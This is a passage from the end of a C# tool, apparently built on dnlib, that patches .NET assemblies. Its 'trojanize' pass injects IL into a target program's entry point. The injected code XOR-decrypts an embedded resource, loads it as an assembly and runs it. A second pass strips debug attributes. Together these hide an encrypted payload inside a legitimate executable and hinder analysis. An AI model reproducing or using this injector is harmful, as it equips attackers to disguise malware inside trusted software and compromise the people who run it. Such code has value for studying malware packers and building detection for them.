        body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[5]));

        // Loop: plain[i] = enc[i] ^ keyArr[i % keyArr.Length]
        var loopCheck = OpCodes.Nop.ToInstruction();
        body.Instructions.Add(OpCodes.Br.ToInstruction(loopCheck));

        var loopBody = OpCodes.Ldloc.ToInstruction(body.Variables[4]); // plain
        body.Instructions.Add(loopBody);
        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5])); // i
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction()); // enc
        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5])); // i
        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
        body.Instructions.Add(OpCodes.Ldloc_3.ToInstruction()); // keyArr
        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5])); // i
        body.Instructions.Add(OpCodes.Ldloc_3.ToInstruction()); // keyArr
        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
        body.Instructions.Add(OpCodes.Rem.ToInstruction());
        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
        body.Instructions.Add(OpCodes.Xor.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_U1.ToInstruction());
        body.Instructions.Add(OpCodes.Stelem_I1.ToInstruction());

        // i++
        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5]));
        body.Instructions.Add(OpCodes.Ldc_I4_1.ToInstruction());
        body.Instructions.Add(OpCodes.Add.ToInstruction());
        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[5]));

        // i < enc.Length
        body.Instructions.Add(loopCheck);
        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5]));
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
        body.Instructions.Add(OpCodes.Blt.ToInstruction(loopBody));

        // var loaded = Assembly.Load(plain);
        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
        body.Instructions.Add(OpCodes.Call.ToInstruction(assemblyLoad));
        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));

        // var ep = loaded.EntryPoint;
        body.Instructions.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getEntryPoint));

        // Check if entry point has parameters
        body.Instructions.Add(OpCodes.Dup.ToInstruction());
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getParameters));
        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());

        var hasArgs = OpCodes.Nop.ToInstruction();
        var doInvoke = OpCodes.Nop.ToInstruction();
        body.Instructions.Add(OpCodes.Brtrue.ToInstruction(hasArgs));

        // No params: ep.Invoke(null, null)
        body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
        body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(methodInvoke));
        body.Instructions.Add(OpCodes.Pop.ToInstruction());
        body.Instructions.Add(OpCodes.Br.ToInstruction(doInvoke));

        // Has params: ep.Invoke(null, new object[] { args })
        body.Instructions.Add(hasArgs);

        // Check if original entry point has args parameter
        bool originalHasArgs = entryPoint.Parameters.Count > 0;
        if (originalHasArgs)
        {
            body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
            body.Instructions.Add(OpCodes.Ldc_I4_1.ToInstruction());
            body.Instructions.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
            body.Instructions.Add(OpCodes.Dup.ToInstruction());
            body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
            body.Instructions.Add(OpCodes.Ldarg_0.ToInstruction()); // args from Main(string[] args)
            body.Instructions.Add(OpCodes.Stelem_Ref.ToInstruction());
            body.Instructions.Add(OpCodes.Callvirt.ToInstruction(methodInvoke));
            body.Instructions.Add(OpCodes.Pop.ToInstruction());
        }
        else
        {
            body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
            body.Instructions.Add(OpCodes.Ldnull.ToInstruction());
            body.Instructions.Add(OpCodes.Callvirt.ToInstruction(methodInvoke));
            body.Instructions.Add(OpCodes.Pop.ToInstruction());
        }

        body.Instructions.Add(doInvoke);
        body.Instructions.Add(OpCodes.Ret.ToInstruction());

        body.SimplifyBranches();
        body.OptimizeBranches();
        body.OptimizeMacros();

        Console.Error.WriteLine($"  [trojanize] injected loader into {entryType.Name}.{entryPoint.Name}");
        Console.Error.WriteLine($"  [trojanize] resources: {resourceName}, {keyResourceName}");
    }

    // ── Strip-debug pass ─────────────────────────────────────────────────

    private static void ApplyStripDebug(ModuleDef module)
    {
        // Remove assembly-level debug attributes
        var assembly = module.Assembly;
        if (assembly != null)
        {
            var toRemove = assembly.CustomAttributes
                .Where(a =>
                {
                    var name = a.TypeFullName;
                    return name == "System.Diagnostics.DebuggableAttribute"
                        || name == "System.Runtime.CompilerServices.CompilationRelaxationsAttribute"
                        || name == "System.Runtime.CompilerServices.RuntimeCompatibilityAttribute";
                })
                .ToList();

            foreach (var attr in toRemove)
                assembly.CustomAttributes.Remove(attr);
        }

        // Remove module-level debug custom attributes
        var moduleToRemove = module.CustomAttributes
            .Where(a => a.TypeFullName == "System.Diagnostics.DebuggableAttribute")
            .ToList();
        foreach (var attr in moduleToRemove)
            module.CustomAttributes.Remove(attr);
    }
}
